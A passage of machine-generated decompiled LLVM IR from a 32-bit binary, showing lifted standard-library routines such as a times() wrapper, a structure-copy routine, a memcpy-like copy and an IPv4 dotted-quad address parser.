  %v2_8052146 = add i32 %v0_8052144, %arg1
  %v1_805214a = call i32 @function_80522ef(i32 %v2_8052146)
  %v2_8052152 = icmp slt i32 %v1_805214a, 0
  %v1_8052154 = icmp eq i1 %v2_8052152, false
  br i1 %v1_8052154, label %dec_label_pc_8052141.dec_label_pc_8052159_crit_edge, label %dec_label_pc_8052156

dec_label_pc_8052141.dec_label_pc_8052159_crit_edge: ; preds = %dec_label_pc_8052141
  %v0_8052159.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8052159

dec_label_pc_8052156:                             ; preds = %dec_label_pc_8052141, %dec_label_pc_8052123
  br label %dec_label_pc_8052159

dec_label_pc_8052159:                             ; preds = %dec_label_pc_8052134, %dec_label_pc_8052141.dec_label_pc_8052159_crit_edge, %dec_label_pc_8052156
  %v0_8052159 = phi i32 [ %v0_8052159.pre, %dec_label_pc_8052141.dec_label_pc_8052159_crit_edge ], [ -1, %dec_label_pc_8052156 ], [ %v0_8052144, %dec_label_pc_8052134 ]
  %v2_805215b = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805215b, i32* @edx, align 4
  store i32 %v0_8052112, i32* @ebx, align 4
  ret i32 %v0_8052159

; uselistorder directives
  uselistorder i32 %v0_8052144, { 1, 0, 2 }
  uselistorder i32 (i32)* @function_80522ef, { 1, 0 }
  uselistorder label %dec_label_pc_8052159, { 2, 1, 0 }
}

define i32 @function_805215f(%tms* %arg1) local_unnamed_addr {
dec_label_pc_805215f:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805215f = load i32, i32* @edi, align 4
  store i32 %v0_805215f, i32* %stack_var_-4, align 4
  %v4_8052163 = ptrtoint %tms* %arg1 to i32
  store i32 %v4_8052163, i32* %edi.global-to-local, align 4
  %v0_8052167 = load i32, i32* @ebx, align 4
  %v3_805216f = call i32 @times(%tms* %arg1)
  store i32 %v3_805216f, i32* %edi.global-to-local, align 4
  %tmp9 = icmp ult i32 %v3_805216f, -4095
  br i1 %tmp9, label %dec_label_pc_8052187, label %dec_label_pc_805217b

dec_label_pc_805217b:                             ; preds = %dec_label_pc_805215f
  %v1_805217b = call i32 @function_804ffeb(i32 %v0_8052167)
  %v0_8052180 = load i32, i32* %edi.global-to-local, align 4
  %v1_8052180 = sub i32 0, %v0_8052180
  %v2_8052182 = inttoptr i32 %v1_805217b to i32*
  store i32 %v1_8052180, i32* %v2_8052182, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_805218b.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8052187

dec_label_pc_8052187:                             ; preds = %dec_label_pc_805215f, %dec_label_pc_805217b
  %v2_805218b = phi i32 [ %v0_805215f, %dec_label_pc_805215f ], [ %v2_805218b.pre, %dec_label_pc_805217b ]
  %v0_8052187 = phi i32 [ %v3_805216f, %dec_label_pc_805215f ], [ -1, %dec_label_pc_805217b ]
  store i32 %v2_805218b, i32* %edi.global-to-local, align 4
  ret i32 %v0_8052187

; uselistorder directives
  uselistorder i32 %v3_805216f, { 1, 0, 2 }
  uselistorder i32* @edi, { 10, 11, 12, 13, 14, 15, 140, 2, 141, 148, 36, 46, 47, 48, 49, 50, 37, 38, 39, 40, 41, 42, 43, 44, 45, 3, 4, 5, 6, 7, 8, 9, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 0, 26, 27, 28, 29, 30, 146, 147, 31, 32, 33, 34, 35, 51, 52, 53, 54, 55, 56, 104, 57, 58, 59, 105, 106, 142, 143, 144, 145, 97, 98, 99, 139, 108, 109, 110, 111, 112, 113, 114, 115, 63, 64, 65, 83, 84, 85, 67, 68, 69, 70, 71, 91, 92, 93, 94, 95, 96, 80, 81, 82, 86, 87, 88, 89, 90, 116, 117, 100, 118, 107, 119, 120, 121, 60, 61, 62, 101, 72, 66, 73, 74, 75, 76, 77, 78, 79, 102, 103, 122, 123, 124, 125, 126, 127, 1, 128, 129, 130, 131, 132, 133, 134, 135, 136, 138, 137 }
  uselistorder %tms* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8052187, { 1, 0 }
}

define i32 @function_805218d(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_805218d:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_805218e = load i32, i32* @ebx, align 4
  store i32 %v0_805218e, i32* %stack_var_-8, align 4
  %v4_8052192 = ptrtoint i16* %arg1 to i32
  store i32 %v4_8052192, i32* %esi.global-to-local, align 4
  store i32 %arg2, i32* %ebx.global-to-local, align 4
  %v3_805219f = inttoptr i32 %arg2 to i8*
  %v4_805219f = call i32 @function_805003c(i8* %v3_805219f, i32 0, i32 88)
  store i32 %v4_805219f, i32* %eax.global-to-local, align 4
  %v2_80521a4 = load i16, i16* %arg1, align 2
  %v3_80521a4 = zext i16 %v2_80521a4 to i32
  store i32 %v3_80521a4, i32* %eax.global-to-local, align 4
  %v0_80521a7 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80521a7 = add i32 %v0_80521a7, 4
  %v2_80521a7 = inttoptr i32 %v1_80521a7 to i32*
  store i32 0, i32* %v2_80521a7, align 4
  %v0_80521ae = load i32, i32* %eax.global-to-local, align 4
  %v1_80521ae = load i32, i32* %ebx.global-to-local, align 4
  %v2_80521ae = inttoptr i32 %v1_80521ae to i32*
  store i32 %v0_80521ae, i32* %v2_80521ae, align 4
  %v0_80521b0 = load i32, i32* %esi.global-to-local, align 4
  %v1_80521b0 = add i32 %v0_80521b0, 4
  %v2_80521b0 = inttoptr i32 %v1_80521b0 to i32*
  %v3_80521b0 = load i32, i32* %v2_80521b0, align 4
  store i32 %v3_80521b0, i32* %eax.global-to-local, align 4
  %v1_80521b3 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80521b3 = add i32 %v1_80521b3, 12
  %v3_80521b3 = inttoptr i32 %v2_80521b3 to i32*
  store i32 %v3_80521b0, i32* %v3_80521b3, align 4
  %v0_80521b6 = load i32, i32* %esi.global-to-local, align 4
  %v1_80521b6 = add i32 %v0_80521b6, 8
  %v2_80521b6 = inttoptr i32 %v1_80521b6 to i16*
  %v3_80521b6 = load i16, i16* %v2_80521b6, align 2
  %v4_80521b6 = zext i16 %v3_80521b6 to i32
  store i32 %v4_80521b6, i32* %eax.global-to-local, align 4
  %v1_80521ba = load i32, i32* %ebx.global-to-local, align 4
  %v2_80521ba = add i32 %v1_80521ba, 16
  %v3_80521ba = inttoptr i32 %v2_80521ba to i32*
  store i32 %v4_80521b6, i32* %v3_80521ba, align 4
  %v0_80521bd = load i32, i32* %esi.global-to-local, align 4
  %v1_80521bd = add i32 %v0_80521bd, 10
  %v2_80521bd = inttoptr i32 %v1_80521bd to i16*
  %v3_80521bd = load i16, i16* %v2_80521bd, align 2
  %v4_80521bd = zext i16 %v3_80521bd to i32
  store i32 %v4_80521bd, i32* %eax.global-to-local, align 4
  %v1_80521c1 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80521c1 = add i32 %v1_80521c1, 20
  %v3_80521c1 = inttoptr i32 %v2_80521c1 to i32*
  store i32 %v4_80521bd, i32* %v3_80521c1, align 4
  %v0_80521c4 = load i32, i32* %esi.global-to-local, align 4
  %v1_80521c4 = add i32 %v0_80521c4, 12
  %v2_80521c4 = inttoptr i32 %v1_80521c4 to i16*
  %v3_80521c4 = load i16, i16* %v2_80521c4, align 2
  %v4_80521c4 = zext i16 %v3_80521c4 to i32
  store i32 %v4_80521c4, i32* %eax.global-to-local, align 4
  %v1_80521c8 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80521c8 = add i32 %v1_80521c8, 24
  %v3_80521c8 = inttoptr i32 %v2_80521c8 to i32*
  store i32 %v4_80521c4, i32* %v3_80521c8, align 4
  %v0_80521cb = load i32, i32* %esi.global-to-local, align 4
  %v1_80521cb = add i32 %v0_80521cb, 14
  %v2_80521cb = inttoptr i32 %v1_80521cb to i16*
  %v3_80521cb = load i16, i16* %v2_80521cb, align 2
  %v4_80521cb = zext i16 %v3_80521cb to i32
  store i32 %v4_80521cb, i32* %eax.global-to-local, align 4
  %v1_80521cf = load i32, i32* %ebx.global-to-local, align 4
  %v2_80521cf = add i32 %v1_80521cf, 28
  %v3_80521cf = inttoptr i32 %v2_80521cf to i32*
  store i32 %v4_80521cb, i32* %v3_80521cf, align 4
  %v0_80521d2 = load i32, i32* %esi.global-to-local, align 4
  %v1_80521d2 = add i32 %v0_80521d2, 16
  %v2_80521d2 = inttoptr i32 %v1_80521d2 to i16*
  %v3_80521d2 = load i16, i16* %v2_80521d2, align 2
  %v4_80521d2 = zext i16 %v3_80521d2 to i32
  store i32 %v4_80521d2, i32* %eax.global-to-local, align 4
  %v0_80521d6 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80521d6 = add i32 %v0_80521d6, 36
  %v2_80521d6 = inttoptr i32 %v1_80521d6 to i32*
  store i32 0, i32* %v2_80521d6, align 4
  %v0_80521dd = load i32, i32* %eax.global-to-local, align 4
  %v1_80521dd = load i32, i32* %ebx.global-to-local, align 4
  %v2_80521dd = add i32 %v1_80521dd, 32
  %v3_80521dd = inttoptr i32 %v2_80521dd to i32*
  store i32 %v0_80521dd, i32* %v3_80521dd, align 4
  %v0_80521e0 = load i32, i32* %esi.global-to-local, align 4
  %v1_80521e0 = add i32 %v0_80521e0, 20
  %v2_80521e0 = inttoptr i32 %v1_80521e0 to i32*
  %v3_80521e0 = load i32, i32* %v2_80521e0, align 4
  store i32 %v3_80521e0, i32* %eax.global-to-local, align 4
  %v1_80521e3 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80521e3 = add i32 %v1_80521e3, 44
  %v3_80521e3 = inttoptr i32 %v2_80521e3 to i32*
  store i32 %v3_80521e0, i32* %v3_80521e3, align 4
  %v0_80521e6 = load i32, i32* %esi.global-to-local, align 4
  %v1_80521e6 = add i32 %v0_80521e6, 24
  %v2_80521e6 = inttoptr i32 %v1_80521e6 to i32*
  %v3_80521e6 = load i32, i32* %v2_80521e6, align 4
  store i32 %v3_80521e6, i32* %eax.global-to-local, align 4
  %v1_80521e9 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80521e9 = add i32 %v1_80521e9, 48
  %v3_80521e9 = inttoptr i32 %v2_80521e9 to i32*
  store i32 %v3_80521e6, i32* %v3_80521e9, align 4
  %v0_80521ec = load i32, i32* %esi.global-to-local, align 4
  %v1_80521ec = add i32 %v0_80521ec, 28
  %v2_80521ec = inttoptr i32 %v1_80521ec to i32*
  %v3_80521ec = load i32, i32* %v2_80521ec, align 4
  store i32 %v3_80521ec, i32* %eax.global-to-local, align 4
  %v1_80521ef = load i32, i32* %ebx.global-to-local, align 4
  %v2_80521ef = add i32 %v1_80521ef, 52
  %v3_80521ef = inttoptr i32 %v2_80521ef to i32*
  store i32 %v3_80521ec, i32* %v3_80521ef, align 4
  %v0_80521f2 = load i32, i32* %esi.global-to-local, align 4
  %v1_80521f2 = add i32 %v0_80521f2, 32
  %v2_80521f2 = inttoptr i32 %v1_80521f2 to i32*
  %v3_80521f2 = load i32, i32* %v2_80521f2, align 4
  store i32 %v3_80521f2, i32* %eax.global-to-local, align 4
  %v1_80521f5 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80521f5 = add i32 %v1_80521f5, 56
  %v3_80521f5 = inttoptr i32 %v2_80521f5 to i32*
  store i32 %v3_80521f2, i32* %v3_80521f5, align 4
  %v0_80521f8 = load i32, i32* %esi.global-to-local, align 4
  %v1_80521f8 = add i32 %v0_80521f8, 40
  %v2_80521f8 = inttoptr i32 %v1_80521f8 to i32*
  %v3_80521f8 = load i32, i32* %v2_80521f8, align 4
  store i32 %v3_80521f8, i32* %eax.global-to-local, align 4
  %v1_80521fb = load i32, i32* %ebx.global-to-local, align 4
  %v2_80521fb = add i32 %v1_80521fb, 64
  %v3_80521fb = inttoptr i32 %v2_80521fb to i32*
  store i32 %v3_80521f8, i32* %v3_80521fb, align 4
  %v0_80521fe = load i32, i32* %esi.global-to-local, align 4
  %v1_80521fe = add i32 %v0_80521fe, 48
  %v2_80521fe = inttoptr i32 %v1_80521fe to i32*
  %v3_80521fe = load i32, i32* %v2_80521fe, align 4
  store i32 %v3_80521fe, i32* %eax.global-to-local, align 4
  %v1_8052201 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8052201 = add i32 %v1_8052201, 72
  %v3_8052201 = inttoptr i32 %v2_8052201 to i32*
  store i32 %v3_80521fe, i32* %v3_8052201, align 4
  %v2_8052207 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8052207, i32* @ebx, align 4
  ret i32 %v3_80521fe

; uselistorder directives
  uselistorder i32 72, { 1, 0, 2 }
  uselistorder i32 64, { 2, 1, 0 }
  uselistorder i32 40, { 5, 4, 1, 3, 2, 0, 6 }
  uselistorder i32 56, { 2, 1, 0 }
  uselistorder i32 52, { 1, 0, 2, 3 }
  uselistorder i32 48, { 4, 5, 3, 1, 2, 0 }
  uselistorder i32 32, { 22, 23, 29, 15, 19, 20, 21, 24, 1, 0, 2, 3, 18, 4, 5, 6, 7, 8, 26, 25, 10, 9, 12, 11, 13, 14, 17, 16, 27, 28 }
  uselistorder i32 36, { 4, 3, 0, 2, 1 }
  uselistorder i32 14, { 3, 0, 2, 1 }
  uselistorder i32 24, { 17, 18, 13, 14, 15, 19, 16, 20, 21, 1, 2, 10, 34, 39, 7, 5, 11, 24, 31, 0, 3, 32, 8, 4, 29, 40, 35, 9, 22, 23, 36, 12, 25, 6, 26, 27, 28, 30, 33, 37, 38, 41, 42, 43, 44, 46, 47, 45 }
  uselistorder i32 20, { 14, 15, 3, 10, 11, 12, 16, 13, 17, 18, 19, 1, 2, 9, 6, 4, 20, 0, 7, 8, 5, 21, 22, 23 }
  uselistorder i32 16, { 38, 39, 31, 32, 33, 34, 35, 36, 14, 27, 54, 3, 28, 29, 30, 0, 4, 40, 41, 6, 5, 42, 1, 7, 37, 43, 15, 17, 26, 11, 12, 23, 44, 8, 48, 20, 18, 45, 24, 46, 9, 21, 10, 22, 13, 19, 47, 49, 25, 50, 2, 51, 53, 16, 52 }
  uselistorder i32 8, { 40, 29, 30, 31, 32, 33, 34, 35, 36, 10, 106, 11, 107, 18, 12, 19, 82, 83, 84, 85, 86, 87, 88, 3, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 4, 21, 22, 23, 24, 25, 26, 27, 28, 41, 42, 43, 44, 45, 46, 14, 5, 15, 6, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 13, 64, 65, 7, 66, 67, 68, 69, 8, 70, 37, 38, 39, 71, 105, 93, 94, 95, 16, 99, 92, 1, 2, 96, 89, 90, 91, 17, 97, 98, 20, 100, 101, 102, 103, 9, 104, 0 }
  uselistorder i32 (i8*, i32, i32)* @function_805003c, { 1, 4, 3, 2, 0 }
}

define i32 @function_805220a(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_805220a:
  %eax.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_805220b = load i32, i32* @esi, align 4
  store i32 %v0_805220b, i32* %stack_var_-8, align 4
  %sext = mul i32 %arg3, 16777216
  %v4_805220c = sdiv i32 %sext, 16777216
  store i32 %v4_805220c, i32* %eax.global-to-local, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_8052216 = ptrtoint i16* %arg1 to i32
  store i32 %v4_8052216, i32* %edi.global-to-local, align 4
  %v2_805221a = udiv i32 %v4_805220c, 4
  %v3_805221d = inttoptr i32 %arg2 to i8*
  %v4_805221d = bitcast i16* %arg1 to i8*
  %v5_805221d = call i8* @_memcpy(i8* %v4_805221d, i8* %v3_805221d, i32 %v2_805221a)
  %v0_805221f = load i32, i32* %eax.global-to-local, align 4
  %v2_805221f = and i32 %v0_805221f, 2
  %v3_805221f = icmp eq i32 %v2_805221f, 0
  br i1 %v3_805221f, label %dec_label_pc_8052225, label %dec_label_pc_8052223

dec_label_pc_8052223:                             ; preds = %dec_label_pc_805220a
  %v0_8052223 = load i32, i32* %esi.global-to-local, align 4
  %v1_8052223 = inttoptr i32 %v0_8052223 to i16*
  %v2_8052223 = load i16, i16* %v1_8052223, align 2
  %v3_8052223 = load i32, i32* %edi.global-to-local, align 4
  %v4_8052223 = inttoptr i32 %v3_8052223 to i16*
  store i16 %v2_8052223, i16* %v4_8052223, align 2
  %v5_8052223 = load i32, i32* %edi.global-to-local, align 4
  %v6_8052223 = load i32, i32* %esi.global-to-local, align 4
  %v7_8052223 = load i1, i1* @df, align 1
  %v8_8052223 = select i1 %v7_8052223, i32 -2, i32 2
  %v9_8052223 = add i32 %v8_8052223, %v5_8052223
  %v10_8052223 = add i32 %v8_8052223, %v6_8052223
  store i32 %v9_8052223, i32* %edi.global-to-local, align 4
  store i32 %v10_8052223, i32* %esi.global-to-local, align 4
  %v0_8052225.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052225

dec_label_pc_8052225:                             ; preds = %dec_label_pc_805220a, %dec_label_pc_8052223
  %v0_8052225 = phi i32 [ %v0_805221f, %dec_label_pc_805220a ], [ %v0_8052225.pre, %dec_label_pc_8052223 ]
  %v2_8052225 = urem i32 %v0_8052225, 2
  %v3_8052225 = icmp eq i32 %v2_8052225, 0
  br i1 %v3_8052225, label %dec_label_pc_805222a, label %dec_label_pc_8052229

dec_label_pc_8052229:                             ; preds = %dec_label_pc_8052225
  %v0_8052229 = load i32, i32* %esi.global-to-local, align 4
  %v1_8052229 = inttoptr i32 %v0_8052229 to i8*
  %v2_8052229 = load i8, i8* %v1_8052229, align 1
  %v3_8052229 = load i32, i32* %edi.global-to-local, align 4
  %v4_8052229 = inttoptr i32 %v3_8052229 to i8*
  store i8 %v2_8052229, i8* %v4_8052229, align 1
  %v5_8052229 = load i32, i32* %edi.global-to-local, align 4
  %v6_8052229 = load i32, i32* %esi.global-to-local, align 4
  %v7_8052229 = load i1, i1* @df, align 1
  %v8_8052229 = select i1 %v7_8052229, i32 -1, i32 1
  %v9_8052229 = add i32 %v8_8052229, %v5_8052229
  %v10_8052229 = add i32 %v8_8052229, %v6_8052229
  store i32 %v9_8052229, i32* %edi.global-to-local, align 4
  store i32 %v10_8052229, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_805222a

dec_label_pc_805222a:                             ; preds = %dec_label_pc_8052225, %dec_label_pc_8052229
  store i32 %v4_8052216, i32* %eax.global-to-local, align 4
  %v2_805222e = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_805222e, i32* @esi, align 4
  ret i32 %v4_8052216

; uselistorder directives
  uselistorder i32* %esi.global-to-local, { 0, 2, 4, 1, 3, 5, 6 }
  uselistorder i32* %edi.global-to-local, { 0, 2, 3, 1, 4, 5, 6 }
  uselistorder i32* %eax.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32 -2, { 12, 11, 9, 10, 4, 2, 0, 5, 1, 6, 3, 7, 8 }
  uselistorder i1* @df, { 3, 4, 1, 0, 2 }
  uselistorder i32 4, { 3, 40, 41, 32, 33, 34, 35, 150, 151, 154, 155, 0, 159, 160, 161, 152, 10, 18, 156, 158, 71, 80, 81, 82, 83, 84, 4, 72, 73, 74, 75, 76, 77, 78, 79, 69, 70, 21, 12, 22, 23, 24, 25, 26, 27, 28, 5, 30, 29, 42, 6, 43, 11, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 8, 64, 65, 67, 66, 7, 157, 153, 31, 15, 36, 37, 38, 39, 68, 116, 117, 16, 94, 95, 123, 124, 17, 96, 126, 127, 128, 129, 130, 131, 88, 89, 90, 91, 92, 93, 109, 110, 111, 97, 98, 99, 118, 119, 120, 1, 121, 122, 106, 107, 108, 112, 113, 2, 114, 115, 132, 133, 85, 86, 87, 100, 101, 102, 103, 104, 105, 125, 19, 134, 135, 136, 137, 138, 141, 142, 143, 139, 140, 13, 149, 9, 144, 14, 145, 146, 147, 148, 162, 20 }
  uselistorder i32 16777216, { 1, 0, 3, 2, 4, 5, 7, 6, 8, 9 }
  uselistorder i32* @esi, { 112, 113, 13, 14, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 3, 39, 40, 114, 115, 12, 116, 117, 118, 122, 125, 126, 127, 119, 120, 121, 62, 71, 4, 72, 73, 66, 67, 68, 69, 70, 63, 64, 65, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 46, 47, 48, 49, 50, 51, 52, 0, 53, 54, 55, 56, 5, 57, 11, 58, 59, 60, 61, 28, 100, 101, 41, 6, 42, 43, 44, 45, 74, 123, 124, 102, 103, 75, 78, 8, 92, 93, 77, 84, 10, 79, 80, 9, 88, 89, 90, 91, 83, 85, 86, 87, 7, 94, 76, 1, 95, 81, 82, 2, 96, 97, 98, 99, 104, 105, 106, 107, 108, 109, 110, 111, 128 }
  uselistorder label %dec_label_pc_805222a, { 1, 0 }
  uselistorder label %dec_label_pc_8052225, { 1, 0 }
}

define i32 @function_8052231(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8052231:
  %v1_805223c = icmp eq i8* %arg1, null
  br i1 %v1_805223c, label %dec_label_pc_80522bd, label %dec_label_pc_8052240

dec_label_pc_8052240:                             ; preds = %dec_label_pc_8052231
  %v4_8052238 = ptrtoint i8* %arg1 to i32
  %v0_805224e.pre = load i32, i32* bitcast (i32** @global_var_8053088.71 to i32*), align 8
  br label %dec_label_pc_805224b

dec_label_pc_805224b:                             ; preds = %dec_label_pc_8052240, %dec_label_pc_8052294
  %v0_8052294 = phi i32 [ 0, %dec_label_pc_8052240 ], [ %v2_805229a, %dec_label_pc_8052294 ]
  %v2_8052297 = phi i32 [ 1, %dec_label_pc_8052240 ], [ %v3_8052297, %dec_label_pc_8052294 ]
  %v0_805224b = phi i32 [ %v4_8052238, %dec_label_pc_8052240 ], [ %v0_805224b4, %dec_label_pc_8052294 ]
  %v1_805224b = inttoptr i32 %v0_805224b to i8*
  %v2_805224b = load i8, i8* %v1_805224b, align 1
  %v3_805224b = sext i8 %v2_805224b to i32
  %v2_8052254 = mul nsw i32 %v3_805224b, 2
  %v3_8052254 = add i32 %v2_8052254, %v0_805224e.pre
  %v4_8052254 = inttoptr i32 %v3_8052254 to i8*
  %v5_8052254 = load i8, i8* %v4_8052254, align 1
  %v6_8052254 = and i8 %v5_8052254, 8
  %v7_8052254 = icmp eq i8 %v6_8052254, 0
  br i1 %v7_8052254, label %dec_label_pc_80522bd, label %dec_label_pc_805225b

dec_label_pc_805225b:                             ; preds = %dec_label_pc_805224b
  %v4_805226f.pre = load i32, i32* @edx, align 4
  %v2_805226f35 = load i8, i8* %v1_805224b, align 1
  %v3_805226f36 = zext i8 %v2_805226f35 to i32
  %v5_805226f37 = and i32 %v4_805226f.pre, -256
  %v6_805226f38 = or i32 %v3_805226f36, %v5_805226f37
  store i32 %v6_805226f38, i32* @edx, align 4
  %v2_805227139 = sext i8 %v2_805226f35 to i32
  %v2_805227440 = mul nsw i32 %v2_805227139, 2
  %v3_805227441 = add i32 %v2_805227440, %v0_805224e.pre
  %v4_805227442 = inttoptr i32 %v3_805227441 to i16*
  %v5_805227443 = load i16, i16* %v4_805227442, align 2
  %v2_805227945 = and i16 %v5_805227443, 8
  %v3_805227946 = icmp eq i16 %v2_805227945, 0
  %v1_805227b47 = icmp eq i1 %v3_805227946, false
  br i1 %v1_805227b47, label %dec_label_pc_805225f, label %dec_label_pc_805227d

dec_label_pc_805225f:                             ; preds = %dec_label_pc_805225b, %dec_label_pc_805226e
  %v2_805227151 = phi i32 [ %v2_8052271, %dec_label_pc_805226e ], [ %v2_805227139, %dec_label_pc_805225b ]
  %v6_805226f50 = phi i32 [ %v6_805226f, %dec_label_pc_805226e ], [ %v6_805226f38, %dec_label_pc_805225b ]
  %v0_805226e49 = phi i32 [ %v1_805226e, %dec_label_pc_805226e ], [ %v0_805224b, %dec_label_pc_805225b ]
  %v1_805225f48 = phi i32 [ %v3_8052262, %dec_label_pc_805226e ], [ 0, %dec_label_pc_805225b ]
  %v3_805225f = mul i32 %v1_805225f48, 10
  %v2_8052262 = add i32 %v3_805225f, -48
  %v3_8052262 = add i32 %v2_8052262, %v2_805227151
  %v1_8052266 = add i32 %v3_8052262, -255
  %v6_8052266 = sub i32 254, %v3_8052262
  %v7_8052266 = and i32 %v6_8052266, %v3_8052262
  %v8_8052266 = icmp slt i32 %v7_8052266, 0
  %v9_8052266 = icmp eq i32 %v1_8052266, 0
  %v10_8052266 = icmp slt i32 %v1_8052266, 0
  %v3_805226c = icmp eq i1 %v10_8052266, %v8_8052266
  %v4_805226c = icmp eq i1 %v9_8052266, false
  %v5_805226c = and i1 %v4_805226c, %v3_805226c
  br i1 %v5_805226c, label %dec_label_pc_80522bd, label %dec_label_pc_805226e

dec_label_pc_805226e:                             ; preds = %dec_label_pc_805225f
  %v1_805226e = add i32 %v0_805226e49, 1
  %v1_805226f = inttoptr i32 %v1_805226e to i8*
  %v2_805226f = load i8, i8* %v1_805226f, align 1
  %v3_805226f = zext i8 %v2_805226f to i32
  %v5_805226f = and i32 %v6_805226f50, -256
  %v6_805226f = or i32 %v3_805226f, %v5_805226f
  store i32 %v6_805226f, i32* @edx, align 4
  %v2_8052271 = sext i8 %v2_805226f to i32
  %v2_8052274 = mul nsw i32 %v2_8052271, 2
  %v3_8052274 = add i32 %v2_8052274, %v0_805224e.pre
  %v4_8052274 = inttoptr i32 %v3_8052274 to i16*
  %v5_8052274 = load i16, i16* %v4_8052274, align 2
  %v2_8052279 = and i16 %v5_8052274, 8
  %v3_8052279 = icmp eq i16 %v2_8052279, 0
  %v1_805227b = icmp eq i1 %v3_8052279, false
  br i1 %v1_805227b, label %dec_label_pc_805225f, label %dec_label_pc_805227d

dec_label_pc_805227d:                             ; preds = %dec_label_pc_805226e, %dec_label_pc_805225b
  %v1_805225f.lcssa = phi i32 [ 0, %dec_label_pc_805225b ], [ %v3_8052262, %dec_label_pc_805226e ]
  %v0_805226e.lcssa = phi i32 [ %v0_805224b, %dec_label_pc_805225b ], [ %v1_805226e, %dec_label_pc_805226e ]
  %v2_805226f.lcssa = phi i8 [ %v2_805226f35, %dec_label_pc_805225b ], [ %v2_805226f, %dec_label_pc_805226e ]
  %v6_8052274.lcssa.in = phi i16 [ %v5_805227443, %dec_label_pc_805225b ], [ %v5_8052274, %dec_label_pc_805226e ]
  %v8_805227d = sub nsw i32 2, %v2_8052297
  %v9_805227d = and i32 %v8_805227d, %v2_8052297
  %v10_805227d = icmp slt i32 %v9_805227d, 0
  %v11_805227d = icmp eq i32 %v2_8052297, 3
  %v12_805227d = icmp slt i32 %v2_8052297, 3
  %v3_8052281 = icmp eq i1 %v12_805227d, %v10_805227d
  %v4_8052281 = icmp eq i1 %v11_805227d, false
  %v5_8052281 = and i1 %v4_8052281, %v3_8052281
  br i1 %v5_8052281, label %dec_label_pc_805228b, label %dec_label_pc_8052283

dec_label_pc_8052283:                             ; preds = %dec_label_pc_805227d
  %v10_8052283 = icmp eq i8 %v2_805226f.lcssa, 46
  %v1_8052286 = icmp eq i1 %v10_8052283, false
  br i1 %v1_8052286, label %dec_label_pc_80522bd, label %dec_label_pc_8052288

dec_label_pc_8052288:                             ; preds = %dec_label_pc_8052283
  br label %dec_label_pc_8052294

dec_label_pc_805228b:                             ; preds = %dec_label_pc_805227d
  %v4_805228c = icmp ne i8 %v2_805226f.lcssa, 0
  %v2_8052290 = and i16 %v6_8052274.lcssa.in, 32
  %v3_8052290 = icmp eq i16 %v2_8052290, 0
  %or.cond = and i1 %v4_805228c, %v3_8052290
  br i1 %or.cond, label %dec_label_pc_80522bd, label %dec_label_pc_8052294

dec_label_pc_8052294:                             ; preds = %dec_label_pc_805228b, %dec_label_pc_8052288
  %v0_805224b4 = add i32 %v0_805226e.lcssa, 1
  %v2_8052294 = mul i32 %v0_8052294, 256
  %v3_8052297 = add nuw nsw i32 %v2_8052297, 1
  %v2_805229a = or i32 %v1_805225f.lcssa, %v2_8052294
  %v7_80522a0 = icmp sgt i32 %v2_8052297, 3
  br i1 %v7_80522a0, label %dec_label_pc_80522a2, label %dec_label_pc_805224b

dec_label_pc_80522a2:                             ; preds = %dec_label_pc_8052294
  %v4_80522a7 = icmp eq i32 %arg2, 0
  br i1 %v4_80522a7, label %dec_label_pc_80522bf, label %dec_label_pc_80522ae

dec_label_pc_80522ae:                             ; preds = %dec_label_pc_80522a2
  %v1_80522b2 = call i32 @llvm.bswap.i32(i32 %v2_805229a)
  %v2_80522b4 = inttoptr i32 %arg2 to i32*
  store i32 %v1_80522b2, i32* %v2_80522b4, align 4
  br label %dec_label_pc_80522bf

dec_label_pc_80522bd:                             ; preds = %dec_label_pc_805228b, %dec_label_pc_8052283, %dec_label_pc_805224b, %dec_label_pc_805225f, %dec_label_pc_8052231
  br label %dec_label_pc_80522bf

dec_label_pc_80522bf:                             ; preds = %dec_label_pc_80522a2, %dec_label_pc_80522ae, %dec_label_pc_80522bd
  %v0_80522c4 = phi i32 [ 1, %dec_label_pc_80522a2 ], [ 1, %dec_label_pc_80522ae ], [ 0, %dec_label_pc_80522bd ]
  ret i32 %v0_80522c4

; uselistorder directives
  uselistorder i32 %v2_8052271, { 1, 0 }
  uselistorder i32 %v6_805226f, { 1, 0 }
  uselistorder i32 %v1_805226e, { 0, 2, 1 }
  uselistorder i32 %v1_8052266, { 1, 0 }
